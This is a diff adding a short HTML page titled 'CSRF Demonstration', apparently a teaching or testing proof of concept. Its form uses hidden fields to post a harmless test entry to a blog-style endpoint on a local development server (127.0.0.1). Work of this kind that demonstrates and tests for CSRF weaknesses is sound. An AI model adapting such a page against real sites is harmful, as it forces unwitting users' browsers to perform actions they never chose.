@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Demonstration</title>
+</head>
+<body>
+
+<h1>CSRF Demonstration</h1>
+
+<form method="post" action="http://127.0.0.1:8000/post/new/">
+    <input type="hidden" name="title" value="CSRF Test Post">
+    <input type="hidden" name="content" value="This post was submitted from another page.">
+
+    <button type="submit">Submit CSRF Request</button>
+</form>
+
+</body>
+</html>
